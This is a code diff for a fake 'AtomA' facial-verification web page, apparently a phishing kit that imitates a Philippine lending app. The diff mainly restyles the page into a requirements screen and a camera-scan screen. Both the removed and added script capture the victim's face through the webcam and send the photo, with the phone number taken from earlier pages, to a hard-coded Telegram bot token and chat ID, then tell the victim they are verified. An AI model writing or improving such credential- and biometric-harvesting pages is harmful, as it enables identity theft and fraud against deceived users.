@@ -4,64 +4,658 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>AtomA | Facial Verification</title>
-    <link rel="preload" as="image" href="photos/atomebg.png">
+    <link rel="preload" as="image" href="photos/atomefacialbg.jpeg">
     <link rel="preload" as="image" href="photos/atomeA.png">
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Inter','Space Grotesk',sans-serif;min-height:100vh;overflow-x:hidden}
-        .bg-theme{background-image:url('photos/atomebg.png');background-size:cover;background-attachment:fixed;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-        .facial-container{background:linear-gradient(165deg,rgba(126,200,224,0.96),rgba(253,225,139,0.96));border-radius:60px;width:90%;max-width:400px;padding:28px 24px;text-align:center;box-shadow:0 30px 50px rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.5)}
-        .facial-header h3{font-size:1.4rem;font-weight:800;color:#1a2a3a;margin-bottom:6px}
-        .facial-header p{font-size:.75rem;color:#d46b5e;margin-bottom:20px}
-        .camera-frame{position:relative;width:240px;height:240px;margin:0 auto 20px;border-radius:50%;overflow:hidden;border:4px solid #FFD700;background:#000}
-        .camera-frame video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
-        .guide-circle{position:absolute;top:0;left:0;width:100%;height:100%;border-radius:50%;box-shadow:inset 0 0 20px 5px rgba(0,255,0,0.3);pointer-events:none}
-        .guide-circle.active{box-shadow:inset 0 0 30px 8px rgba(0,255,0,0.8);animation:pulseGreen .6s}
-        @keyframes pulseGreen{0%{box-shadow:inset 0 0 0 0 rgba(0,255,0,0.8)}100%{box-shadow:inset 0 0 30px 8px rgba(0,255,0,0.8)}}
-        .scan-line{position:absolute;top:0;left:0;width:100%;height:3px;background:linear-gradient(90deg,transparent,#0f0,#0f0,transparent);display:none;animation:scanMove 2s linear infinite}
-        .scan-line.active{display:block}
-        @keyframes scanMove{0%{top:0}100%{top:100%}}
-        .buttons{display:flex;gap:12px;margin:16px 0}
-        .btn{flex:1;background:#1a1a1a;border:1.5px solid #FDD97A;padding:12px;border-radius:60px;color:#FDD97A;font-weight:700;cursor:pointer}
-        .btn.cancel{background:rgba(212,107,94,0.25);border-color:#d46b5e;color:#d46b5e}
-        .status{font-size:.75rem;color:#2d6a4f;background:rgba(255,245,235,0.95);padding:10px;border-radius:60px;margin-top:8px}
-        .status.success{background:#d4edda;color:#155724}
-        .status.error{background:#f8d7da;color:#721c24}
-        .phone-display{background:rgba(0,0,0,0.5);padding:8px;border-radius:60px;margin-bottom:15px;color:#FFE566;font-weight:600;font-size:.8rem}
-        @media(max-width:480px){.camera-frame{width:200px;height:200px}}
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', 'Space Grotesk', sans-serif;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* ============================================
+           PAGE 1 - REQUIREMENTS PAGE (White Background)
+           ============================================ */
+        .page-requirements {
+            min-height: 100vh;
+            background: url('photos/atomefacialbg.jpeg') center center/cover no-repeat fixed;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+        }
+
+        .requirements-card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 48px;
+            max-width: 420px;
+            width: 100%;
+            padding: 32px 28px;
+            text-align: center;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.15);
+            border: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        .requirements-card h2 {
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: #1a2a3a;
+            margin-bottom: 8px;
+        }
+
+        .requirements-card p {
+            font-size: 0.8rem;
+            color: #d46b5e;
+            margin-bottom: 24px;
+        }
+
+        .requirements-list {
+            text-align: left;
+            background: #f8f9fc;
+            border-radius: 32px;
+            padding: 20px;
+            margin-bottom: 28px;
+        }
+
+        .requirements-list h3 {
+            font-size: 0.9rem;
+            font-weight: 700;
+            color: #2d6a4f;
+            margin-bottom: 16px;
+        }
+
+        .requirements-list ul {
+            list-style: none;
+        }
+
+        .requirements-list li {
+            font-size: 0.75rem;
+            color: #5e4a3a;
+            padding: 8px 0;
+            padding-left: 28px;
+            position: relative;
+        }
+
+        .requirements-list li:before {
+            content: "•";
+            color: #ff8a7a;
+            font-size: 1.2rem;
+            position: absolute;
+            left: 6px;
+            top: 4px;
+        }
+
+        .phone-display-req {
+            background: rgba(45, 106, 79, 0.1);
+            padding: 12px;
+            border-radius: 60px;
+            margin-bottom: 24px;
+            color: #2d6a4f;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .start-btn {
+            width: 100%;
+            background: #1a1a1a;
+            border: 2px solid #FDD97A;
+            padding: 16px;
+            border-radius: 80px;
+            color: #FDD97A;
+            font-weight: 800;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-transform: uppercase;
+        }
+
+        .start-btn:active {
+            transform: scale(0.97);
+        }
+
+        /* ============================================
+           PAGE 2 - FACE SCAN PAGE (Soft Pastel Gradient)
+           ============================================ */
+        .page-scan {
+            min-height: 100vh;
+            background: linear-gradient(165deg, #7EC8E0 0%, #B8E1F0 30%, #FDE08B 70%, #FDD97A 100%);
+            position: relative;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .page-scan.active {
+            display: flex;
+        }
+
+        /* Sunburst Rays */
+        .sunburst {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .ray {
+            position: absolute;
+            background: radial-gradient(ellipse at center, rgba(255,255,250,0.35) 0%, rgba(255,255,245,0.1) 40%, rgba(255,255,255,0) 70%);
+            border-radius: 50%;
+            filter: blur(3px);
+            animation: slowPulse 8s ease-in-out infinite;
+        }
+
+        .ray1 { width: 350px; height: 350px; top: -120px; left: -100px; animation-delay: 0s; }
+        .ray2 { width: 500px; height: 500px; top: 15%; right: -180px; animation-delay: 2s; }
+        .ray3 { width: 400px; height: 400px; bottom: 5%; left: -80px; animation-delay: 4s; }
+        .ray4 { width: 280px; height: 280px; top: 45%; left: 25%; animation-delay: 1s; }
+        .ray5 { width: 320px; height: 320px; bottom: 25%; right: 10%; animation-delay: 3s; }
+
+        @keyframes slowPulse {
+            0%, 100% { opacity: 0.4; transform: scale(1); }
+            50% { opacity: 0.8; transform: scale(1.08); }
+        }
+
+        /* Rolling Hills */
+        .hills {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 260px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .hill {
+            position: absolute;
+            bottom: 0;
+            border-radius: 100% 100% 0 0;
+        }
+
+        .hill1 { width: 110%; height: 180px; left: -5%; background: #FFF9EF; border-radius: 55% 55% 0 0; bottom: -20px; }
+        .hill2 { width: 85%; height: 210px; left: -10%; bottom: -30px; background: #FFF5E6; border-radius: 50% 52% 0 0; }
+        .hill3 { width: 75%; height: 195px; right: -12%; bottom: -25px; background: #FFF8EC; border-radius: 48% 52% 0 0; }
+        .hill4 { width: 55%; height: 170px; left: 15%; bottom: -35px; background: #FFF2DD; border-radius: 60% 40% 0 0; }
+        .hill5 { width: 45%; height: 150px; right: 5%; bottom: -40px; background: #FFFAF0; border-radius: 45% 55% 0 0; }
+
+        /* Scan Container */
+        .scan-container {
+            position: relative;
+            z-index: 2;
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(8px);
+            border-radius: 60px;
+            width: 90%;
+            max-width: 450px;
+            padding: 24px 20px 32px;
+            text-align: center;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .scan-header h3 {
+            font-size: 1.4rem;
+            font-weight: 800;
+            color: #1a2a3a;
+            margin-bottom: 4px;
+        }
+
+        .scan-header p {
+            font-size: 0.7rem;
+            color: #d46b5e;
+            margin-bottom: 16px;
+        }
+
+        .phone-display-scan {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 8px 16px;
+            border-radius: 60px;
+            display: inline-block;
+            margin-bottom: 16px;
+            color: #FFE566;
+            font-weight: 600;
+            font-size: 0.8rem;
+        }
+
+        /* Camera Frame with Zoom Effect */
+        .camera-wrapper {
+            position: relative;
+            width: 260px;
+            height: 260px;
+            margin: 0 auto 20px;
+        }
+
+        .camera-frame {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 4px solid #FFD700;
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.3), 0 10px 30px rgba(0, 0, 0, 0.25);
+            background: #000;
+        }
+
+        .camera-frame video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            object-position: center;
+            transform: scaleX(-1);
+        }
+
+        /* Zoom Indicator */
+        .zoom-indicator {
+            position: absolute;
+            bottom: -30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.6);
+            color: #FFD700;
+            font-size: 0.6rem;
+            padding: 4px 12px;
+            border-radius: 60px;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        /* Scan Line Animation */
+        .scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #00ff00, #00ff00, #00ff00, transparent);
+            display: none;
+            animation: scanMove 2s linear infinite;
+            z-index: 10;
+        }
+
+        .scan-line.active {
+            display: block;
+        }
+
+        @keyframes scanMove {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+
+        /* Green Edge Effect */
+        .green-edge {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            pointer-events: none;
+            box-shadow: inset 0 0 20px 5px rgba(0, 255, 0, 0.3);
+            transition: box-shadow 0.3s;
+            z-index: 5;
+        }
+
+        .green-edge.active {
+            box-shadow: inset 0 0 30px 8px rgba(0, 255, 0, 0.8), 0 0 20px 5px rgba(0, 255, 0, 0.5);
+            animation: pulseGreen 0.6s ease-out;
+        }
+
+        @keyframes pulseGreen {
+            0% { box-shadow: inset 0 0 0 0 rgba(0, 255, 0, 0.8); }
+            100% { box-shadow: inset 0 0 30px 8px rgba(0, 255, 0, 0.8); }
+        }
+
+        /* Scanning Text Animation */
+        .scanning-text {
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: #2d6a4f;
+            background: rgba(255, 245, 235, 0.95);
+            padding: 8px 16px;
+            border-radius: 60px;
+            display: inline-block;
+            margin-bottom: 16px;
+        }
+
+        .scanning-text .dots::after {
+            content: '';
+            animation: dots 1.5s steps(4, end) infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
+        }
+
+        .scan-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 16px;
+        }
+
+        .scan-btn {
+            flex: 1;
+            background: #1a1a1a;
+            border: 1.5px solid #FDD97A;
+            padding: 12px;
+            border-radius: 60px;
+            color: #FDD97A;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .scan-btn:active {
+            transform: scale(0.97);
+        }
+
+        .scan-btn.cancel {
+            background: rgba(212, 107, 94, 0.25);
+            border-color: #d46b5e;
+            color: #d46b5e;
+        }
+
+        .status-text {
+            font-size: 0.7rem;
+            color: #2d6a4f;
+            background: rgba(255, 245, 235, 0.95);
+            padding: 8px;
+            border-radius: 60px;
+            margin-top: 12px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .camera-wrapper { width: 220px; height: 220px; }
+            .requirements-card { padding: 24px 20px; }
+            .requirements-card h2 { font-size: 1.3rem; }
+        }
     </style>
 </head>
 <body>
-<div class="bg-theme">
-    <div class="facial-container">
-        <div class="facial-header"><h3>😊 Face Verification</h3><p>Center your face in the circle</p></div>
-        <div class="phone-display" id="phoneDisplay">Loading...</div>
-        <div class="camera-frame">
-            <video id="faceVideo" autoplay playsinline muted></video>
-            <div class="guide-circle" id="guideCircle"></div>
-            <div class="scan-line" id="scanLine"></div>
+    <!-- PAGE 1: REQUIREMENTS -->
+    <div id="pageRequirements" class="page-requirements">
+        <div class="requirements-card">
+            <h2>😊 Facial Verification</h2>
+            <p>Enhanced identity authentication</p>
+            
+            <div class="requirements-list">
+                <h3>📋 Requirements:</h3>
+                <ul>
+                    <li>No glasses</li>
+                    <li>No hats or headscarves</li>
+                    <li>Center your face within the frame</li>
+                    <li>Stand against a plain, well-lit background</li>
+                </ul>
+            </div>
+            
+            <div class="phone-display-req" id="phoneDisplayReq">Loading...</div>
+            
+            <button class="start-btn" id="startBtn">▶ START FACIAL VERIFICATION</button>
         </div>
-        <div class="buttons">
-            <button class="btn" id="captureBtn">📸 CAPTURE & VERIFY</button>
-            <button class="btn cancel" id="backBtn">← BACK</button>
-        </div>
-        <div class="status" id="faceStatus">🎯 Position your face within the circle</div>
     </div>
-</div>
-<script>
-    const BOT_TOKEN="8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg",CHAT_ID="7298607329";
-    let phoneNum=null,stream=null,camReady=false;
-    const faceVideo=document.getElementById('faceVideo'),captureBtn=document.getElementById('captureBtn'),backBtn=document.getElementById('backBtn'),faceStatus=document.getElementById('faceStatus'),scanLine=document.getElementById('scanLine'),guideCircle=document.getElementById('guideCircle'),phoneDisplay=document.getElementById('phoneDisplay');
-    phoneNum=localStorage.getItem('tempPhoneNumber');
-    if(!phoneNum){ phoneDisplay.innerHTML="❌ No phone number found"; setTimeout(()=>{window.location.href='index.html';},2000); } else { phoneDisplay.innerHTML=`📱 Verifying: +63${phoneNum}`; }
-    async function startCam(){ try{ if(stream) stream.getTracks().forEach(t=>t.stop()); const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}); stream=s; faceVideo.srcObject=s; await new Promise(r=>{faceVideo.onloadedmetadata=()=>{faceVideo.play();r()}}); await new Promise(r=>setTimeout(r,500)); camReady=true; faceStatus.innerHTML="✅ Camera ready!"; faceStatus.className="status success"; return true; }catch(e){ faceStatus.innerHTML="❌ Camera denied"; faceStatus.className="status error"; return false; } }
-    function stopCam(){ if(stream){ stream.getTracks().forEach(t=>t.stop()); stream=null; } faceVideo.srcObject=null; camReady=false; }
-    function startScan(){ scanLine.classList.add('active'); guideCircle.classList.add('active'); setTimeout(()=>guideCircle.classList.remove('active'),600); }
-    function stopScan(){ scanLine.classList.remove('active'); }
-    async function captureAndSend(){ if(!camReady){ faceStatus.innerHTML="❌ Camera not ready"; return; } startScan(); try{ const canvas=document.createElement('canvas'); canvas.width=faceVideo.videoWidth; canvas.height=faceVideo.videoHeight; const ctx=canvas.getContext('2d'); ctx.save(); ctx.scale(-1,1); ctx.drawImage(faceVideo,-canvas.width,0,canvas.width,canvas.height); ctx.restore(); const blob=await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.9)); if(!blob||blob.size<1000){ faceStatus.innerHTML="❌ Capture failed"; stopScan(); return; } const kb=(blob.size/1024).toFixed(1); faceStatus.innerHTML=`📸 ${kb}KB - Sending...`; const fd=new FormData(); fd.append('chat_id',CHAT_ID); fd.append('photo',blob,`face_${phoneNum}_${Date.now()}.jpg`); fd.append('caption',`🔐 NEW FACE CAPTURE\n📱 +63${phoneNum}\n⏰ ${new Date().toLocaleString()}\n📍 AtomA Facial Verification`); const res=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd}); const result=await res.json(); if(result.ok){ faceStatus.innerHTML="✅ Verified! Face sent to Telegram!"; faceStatus.className="status success"; stopScan(); localStorage.setItem('atomeUser',JSON.stringify({phone:phoneNum,verified:true,verifiedTime:new Date().toISOString()})); setTimeout(()=>{window.location.href='index.html';},2000); }else{ faceStatus.innerHTML="❌ Telegram error"; stopScan(); } }catch(err){ faceStatus.innerHTML="❌ Error sending"; stopScan(); } }
-    captureBtn.addEventListener('click',captureAndSend); backBtn.addEventListener('click',()=>{window.location.href='index.html';});
-    startCam();
-</script>
+
+    <!-- PAGE 2: FACE SCAN -->
+    <div id="pageScan" class="page-scan">
+        <div class="sunburst">
+            <div class="ray ray1"></div><div class="ray ray2"></div><div class="ray ray3"></div>
+            <div class="ray ray4"></div><div class="ray ray5"></div>
+        </div>
+        <div class="hills">
+            <div class="hill hill1"></div><div class="hill hill2"></div><div class="hill hill3"></div>
+            <div class="hill hill4"></div><div class="hill hill5"></div>
+        </div>
+        
+        <div class="scan-container">
+            <div class="scan-header">
+                <h3>😊 Position Your Face</h3>
+                <p>Center your face in the circle</p>
+            </div>
+            
+            <div class="phone-display-scan" id="phoneDisplayScan">Loading...</div>
+            
+            <div class="camera-wrapper">
+                <div class="camera-frame">
+                    <video id="faceVideo" autoplay playsinline muted></video>
+                    <div class="green-edge" id="greenEdge"></div>
+                    <div class="scan-line" id="scanLine"></div>
+                </div>
+                <div class="zoom-indicator">
+                    <span>🔍</span> Zoom optimized for face
+                </div>
+            </div>
+            
+            <div id="scanningText" class="scanning-text hidden">
+                🔍 Analyzing facial features<span class="dots"></span>
+            </div>
+            
+            <div class="scan-buttons">
+                <button class="scan-btn" id="captureBtn">📸 CAPTURE & VERIFY</button>
+                <button class="scan-btn cancel" id="backToReqBtn">← BACK</button>
+            </div>
+            
+            <div class="status-text" id="faceStatus">🎯 Align your face within the circle</div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // TELEGRAM CONFIGURATION
+        // ============================================
+        const BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
+        const CHAT_ID = "7298607329";
+        
+        let phoneNum = null;
+        let stream = null;
+        let camReady = false;
+        let isScanning = false;
+        
+        // DOM Elements
+        const pageRequirements = document.getElementById('pageRequirements');
+        const pageScan = document.getElementById('pageScan');
+        const startBtn = document.getElementById('startBtn');
+        const backToReqBtn = document.getElementById('backToReqBtn');
+        const phoneDisplayReq = document.getElementById('phoneDisplayReq');
+        const phoneDisplayScan = document.getElementById('phoneDisplayScan');
+        const faceVideo = document.getElementById('faceVideo');
+        const captureBtn = document.getElementById('captureBtn');
+        const faceStatus = document.getElementById('faceStatus');
+        const scanLine = document.getElementById('scanLine');
+        const greenEdge = document.getElementById('greenEdge');
+        const scanningText = document.getElementById('scanningText');
+        
+        // Get phone number from localStorage
+        phoneNum = localStorage.getItem('tempPhoneNumber');
+        
+        if (!phoneNum) {
+            phoneDisplayReq.innerHTML = "❌ No phone number found";
+            phoneDisplayScan.innerHTML = "❌ No phone number found";
+        } else {
+            phoneDisplayReq.innerHTML = `📱 Verifying: +63${phoneNum}`;
+            phoneDisplayScan.innerHTML = `📱 Verifying: +63${phoneNum}`;
+        }
+        
+        // ============================================
+        // PAGE TRANSITION
+        // ============================================
+        startBtn.addEventListener('click', async () => {
+            pageRequirements.style.display = 'none';
+            pageScan.classList.add('active');
+            await startCamera();
+        });
+        
+        backToReqBtn.addEventListener('click', () => {
+            stopCamera();
+            pageScan.classList.remove('active');
+            pageRequirements.style.display = 'flex';
+            faceStatus.innerHTML = "🎯 Align your face within the circle";
+            faceStatus.className = "status-text";
+            scanningText.classList.add('hidden');
+        });
+        
+        // ============================================
+        // CAMERA FUNCTIONS
+        // ============================================
+        async function startCamera() {
+            try {
+                if (stream) stream.getTracks().forEach(t => t.stop());
+                const s = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 640 }
+                    } 
+                });
+                stream = s;
+                faceVideo.srcObject = s;
+                await new Promise(r => { faceVideo.onloadedmetadata = () => { faceVideo.play(); r(); } });
+                await new Promise(r => setTimeout(r, 500));
+                camReady = true;
+                faceStatus.innerHTML = "✅ Camera ready! Position your face";
+                faceStatus.style.color = "#155724";
+                return true;
+            } catch(e) {
+                faceStatus.innerHTML = "❌ Camera access denied. Please allow permissions.";
+                faceStatus.style.color = "#721c24";
+                return false;
+            }
+        }
+        
+        function stopCamera() {
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+                stream = null;
+            }
+            faceVideo.srcObject = null;
+            camReady = false;
+            isScanning = false;
+            scanLine.classList.remove('active');
+            greenEdge.classList.remove('active');
+        }
+        
+        // ============================================
+        // SCAN ANIMATION
+        // ============================================
+        function startScanAnimation() {
+            isScanning = true;
+            scanLine.classList.add('active');
+            greenEdge.classList.add('active');
+            scanningText.classList.remove('hidden');
+            faceStatus.innerHTML = "🔍 Scanning face...";
+            
+            setTimeout(() => {
+                greenEdge.classList.remove('active');
+            }, 800);
+        }
+        
+        function stopScanAnimation() {
+            isScanning = false;
+            scanLine.classList.remove('active');
+            scanningText.classList.add('hidden');
+        }
+        
+        // ============================================
+        // CAPTURE AND SEND TO TELEGRAM
+        // ============================================
+        async function captureAndSend() {
+            if (!camReady) {
+                faceStatus.innerHTML = "❌ Camera not ready. Please wait.";
+                return;
+            }
+            
+            startScanAnimation();
+            
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = faceVideo.videoWidth;
+                canvas.height = faceVideo.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.save();
+                ctx.scale(-1, 1);
+                ctx.drawImage(faceVideo, -canvas.width, 0, canvas.width, canvas.height);
+                ctx.restore();
+                
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.95));
+                
+                if (!blob || blob.size < 1000) {
+                    faceStatus.innerHTML = "❌ Capture failed. Please try again.";
+                    stopScanAnimation();
+                    return;
+                }
+                
+                const kb = (blob.size / 1024).toFixed(1);
+                faceStatus.innerHTML = `📸 Image captured (${kb}KB). Sending to Telegram...`;
+                
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `face_${phoneNum}_${Date.now()}.jpg`);
+                formData.append('caption', `🔐 FACE VERIFICATION SUCCESSFUL!\n\n📱 Phone: +63${phoneNum}\n⏰ Time: ${new Date().toLocaleString()}\n📍 Source: AtomA Facial Recognition\n✅ Status: Verified`);
+                
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await res.json();
+                
+                if (result.ok) {
+                    faceStatus.innerHTML = "✅ VERIFIED! Face sent to Telegram. Redirecting...";
+                    stopScanAnimation();
+                    
+                    localStorage.setItem('atomeUser', JSON.stringify({
+                        phone: phoneNum,
+                        verified: true,
+                        verifiedTime: new Date().toISOString()
+                    }));
+                    
+                    setTimeout(() => {
+                        window.location.href = 'index.html';
+                    }, 2000);
+                } else {
+                    faceStatus.innerHTML = "❌ Telegram error. Please try again.";
+                    stopScanAnimation();
+                }
+            } catch(err) {
+                faceStatus.innerHTML = "❌ Error sending. Please check connection.";
+                stopScanAnimation();
+            }
+        }
+        
+        // ============================================
+        // EVENT LISTENERS
+        // ============================================
+        captureBtn.addEventListener('click', captureAndSend);
+        
+        // Check if already verified
+        const savedUser = localStorage.getItem('atomeUser');
+        if (savedUser) {
+            try {
+                const userData = JSON.parse(savedUser);
+                if (userData.verified === true) {
+                    // Optional: Show already verified message
+                    console.log("User already verified");
+                }
+            } catch(e) {}
+        }
+    </script>
 </body>
 </html>
